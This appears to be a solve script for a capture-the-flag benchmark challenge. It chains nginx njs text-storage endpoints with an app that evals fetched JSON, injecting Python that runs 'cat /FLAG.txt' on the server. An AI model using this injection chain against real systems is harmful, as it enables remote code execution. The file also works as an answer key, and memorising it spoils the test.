#!/usr/bin/env bash
# XBEN-082-24 — "Unlogic nginx interaction" (tags: command_injection)
#
# Three services and no single bug. `/app` asks nginx where the API is, fetches
# that URL, and `eval`s the `script` field of the JSON it gets back. nginx has
# two njs endpoints that store and return arbitrary text: `/name/set` writes it
# and `/name` reads it back.
#
# So nginx becomes the file server for the payload. Point the API URL at
# `http://nginx/name`, store JSON there, and the app fetches it and evaluates
# it. Each piece is doing exactly what it was written to do.
#
# All three requests are edits to one captured request, which is what makes a
# chain like this readable: the session's receipts show the whole sequence, in
# order, afterwards.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben082-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

PAYLOAD='{"script":"__import__('"'"'os'"'"').popen('"'"'cat /FLAG.txt'"'"').read()"}'

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# 1. Store the payload in nginx's own name slot.
"$H5I" websec replay req_0 --create --set 'path=/name/set' \
    --set "query.name=$PAYLOAD" --session "$SESSION" >/dev/null

# 2. Point the app's API URL at the endpoint that reads it back. `nginx` is the
#    compose service name: reachable from the app, not from here.
"$H5I" websec replay req_0 --create --set 'path=/api/set' \
    --set 'query.url=http://nginx/name' --session "$SESSION" >/dev/null

# 3. Load the app, which fetches and evaluates.
REPLAY="$("$H5I" websec replay req_0 --create --set 'path=/app' --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
